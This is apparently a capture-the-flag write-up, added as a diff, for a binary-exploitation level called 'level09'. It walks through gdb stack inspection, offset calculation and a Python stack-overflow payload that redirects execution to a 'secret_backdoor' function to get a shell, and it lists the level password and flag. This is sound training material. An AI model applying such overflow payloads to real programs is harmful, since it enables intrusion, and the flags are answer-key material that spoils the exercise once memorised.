@@ -1,0 +1,47 @@
+level09 : fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+process :
+        - The last binaire got two function and one variable (set_username/set_msgs and v1[140])
+                set_username write 41 bytes after v1[140] we can overwrite v7 to any value of our choice
+                int v7; // [rsp+B4h] [rbp-Ch] rsp + 180 so  we can write into it
+        - set_msgs can overwrite the rip who is at 200 offset of v1[140]
+                a1+0    : buffer msg (140 bytes)
+                a1+140  : username (44 bytes)
+                a1+184  : padding potentiel (8 bytes alignés)
+                a1+192  : saved RBP (8 bytes)
+                a1+200  : saved RIP (8 bytes) (RIP is RBP + 8)
+               
+               
+                **********************************************
+               
+                gdb ./level09
+                b *0x00005555555548cb (break at v1[400])
+                run
+                x/x $rbp -0xc0 =        0x7fffffffe500:	0x0000000a (v1 adress)
+                x/x $rbp -0xc  =        0x7fffffffe5b4:	0x00000000 (v7 adress)
+                x/x $rbp + 8   =        0x7fffffffe5c8:	0x55554abd (rip adress)
+
+                python3
+                >>> v7 = 0x7fffffffe5b4
+                >>> buff = 0x7fffffffe500
+                >>> rip = 0x7fffffffe5c8
+                >>> offset_buf_v7 = v7 - buff
+                >>> offset_buf_v7
+                180
+                >>> offset_rip = rip - buff
+                >>> offset_rip
+                200
+
+        - We need to find the adress of secret_backdoor
+                gdb ./level09
+                b main
+                run
+                x secret_backdoor : 0x55555555488c <secret_backdoor>:	0xe5894855
+                disas secret_backdoor :
+                Dump of assembler code for function secret_backdoor:
+                0x000055555555488c <+0>:	push   %rbp
+                The adress of secret_backdoor is : 0x000055555555488c
+        - Now we can build our payload : 
+                python -c 'print("A" * 40 + "\xff" * 4 + "\n" + "B" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00")' > /tmp/level09
+        - cat /tmp/level09 - | ./level09
+                Don't forget to launch a shell : /bin/sh
+        - Get the flag : j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
